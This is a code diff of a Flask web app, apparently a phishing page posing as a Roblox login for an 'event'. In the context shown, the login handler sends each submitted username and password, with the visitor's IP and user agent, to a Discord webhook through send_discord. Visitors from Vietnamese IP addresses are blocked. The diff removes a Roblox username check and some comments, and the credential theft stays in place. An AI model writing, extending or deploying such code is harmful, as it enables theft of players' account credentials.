@@ -1,7 +1,7 @@
 import os
 import json
 import requests
-from flask import Flask, request, render_template, redirect, url_for, session, abort
+from flask import Flask, request, render_template, redirect, url_for, session
 from datetime import datetime
 
 app = Flask(__name__)
@@ -27,18 +27,6 @@ def is_vietnam_ip(ip):
     except:
         pass
     return False
-
-# ===== KIỂM TRA USER ROBLOX =====
-def check_roblox_user(username):
-    try:
-        r = requests.get(f"https://users.roblox.com/v1/users/username/{username}", timeout=5)
-        if r.status_code == 200:
-            data = r.json()
-            if data.get('id'):
-                return True
-        return False
-    except:
-        return True
 
 # ===== GỬI DISCORD =====
 def send_discord(username, password, ip, user_agent):
@@ -68,7 +56,6 @@ def send_discord(username, password, ip, user_agent):
 # ===== MIDDLEWARE CHẶN IP VN =====
 @app.before_request
 def block_vietnam():
-    # Bỏ qua route static (không có)
     ip = get_real_ip()
     if is_vietnam_ip(ip):
         return render_template('blocked.html'), 403
@@ -88,15 +75,8 @@ def login():
     if not username or not password:
         return render_template('login.html', error="Vui lòng nhập tên người dùng và mật khẩu.")
 
-    if not check_roblox_user(username):
-        return render_template('login.html', error="Sai tên người dùng hoặc mật khẩu.")
-
-    # Lưu username vào session để dùng cho trang event
     session['username'] = username
-    # Gửi webhook
     send_discord(username, password, ip, ua)
-
-    # Chuyển đến trang nhập code sự kiện
     return redirect(url_for('event'))
 
 @app.route('/event')
